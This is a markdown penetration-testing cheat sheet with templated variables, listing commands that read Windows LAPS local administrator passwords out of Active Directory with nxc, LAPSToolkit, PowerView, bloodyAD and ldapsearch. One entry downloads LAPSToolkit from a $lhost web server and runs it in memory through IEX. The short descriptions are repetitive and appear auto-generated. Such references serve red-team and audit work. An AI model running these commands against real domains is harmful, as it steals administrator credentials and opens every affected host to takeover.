# LAPS

Local Administrator Password Solution stores per-machine local admin passwords in AD attributes (`ms-Mcs-AdmPwd` for legacy LAPS, `msLAPS-Password` / `msLAPS-EncryptedPassword` for Windows LAPS). Anyone with read rights on the attribute on a computer object can recover the local admin password for that host.

### nxc LAPS module

Read nxc LAPS module with LAPS.

```sh title:"LAPS Read Nxc LAPS Module"
nxc ldap $domain -u $user $auth_flags -M laps
```
<!-- cheat
import domain_ip
import users
import nxc_auth
-->

### LAPSToolkit list computers

List LAPSToolkit list computers with LAPS.

```powershell title:"LAPS List LAPSToolkit List Computers"
Import-Module .\LAPSToolkit.ps1; Get-LAPSComputers
```
<!-- cheat -->

### LAPSToolkit download and import

Download LAPSToolkit download and import with LAPS.

```powershell title:"LAPS Download LAPSToolkit Download and Import"
(New-Object System.Net.WebClient).DownloadString('http://$lhost/LAPSToolkit.ps1') | IEX; Import-Module .\LAPSToolkit.ps1
```
<!-- cheat
var lhost
-->

### LAPSToolkit delegated groups

Read LAPSToolkit delegated groups with LAPS.

```powershell title:"LAPS Read LAPSToolkit Delegated Groups"
Import-Module .\LAPSToolkit.ps1; Find-LAPSDelegatedGroups
```
<!-- cheat -->

### LAPSToolkit extended rights

Find LAPSToolkit extended rights with LAPS.

```powershell title:"LAPS Find LAPSToolkit Extended Rights"
Import-Module .\LAPSToolkit.ps1; Find-AdmPwdExtendedRights
```
<!-- cheat -->

### LAPSToolkit dump passwords

Dump LAPSToolkit dump passwords with LAPS.

```powershell title:"LAPS Dump LAPSToolkit Dump Passwords"
Get-LAPSPasswords -DomainController $rhost_name -Credential $domain\$user | Format-Table -AutoSize
```
<!-- cheat
import domain_ip
var rhost_name
var user
-->

### PowerView LAPS read

Read PowerView LAPS read with LAPS.

```powershell title:"LAPS Read PowerView LAPS Read"
Get-DomainObject $rhost_name -Properties "ms-mcs-AdmPwd",name
```
<!-- cheat
var rhost_name
-->

### bloodyAD LAPS read

Read bloodyAD LAPS read with LAPS.

```sh title:"LAPS Read BloodyAD LAPS Read"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags get object $target_computer --attr ms-Mcs-AdmPwd
```
<!-- cheat
import domain_ip
import users
import bloody_auth
var rhost_name
var target_computer
-->

### ldapsearch LAPS

Read ldapsearch LAPS with LAPS.

```sh title:"LAPS Read Ldapsearch LAPS"
ldapsearch -x -H ldap://$rhost_ip -D "$user@$domain" -w $pass -b "$base_dn" "(ms-Mcs-AdmPwd=*)" ms-Mcs-AdmPwd sAMAccountName
```
<!-- cheat
import domain_ip
var user
var pass
var base_dn
-->
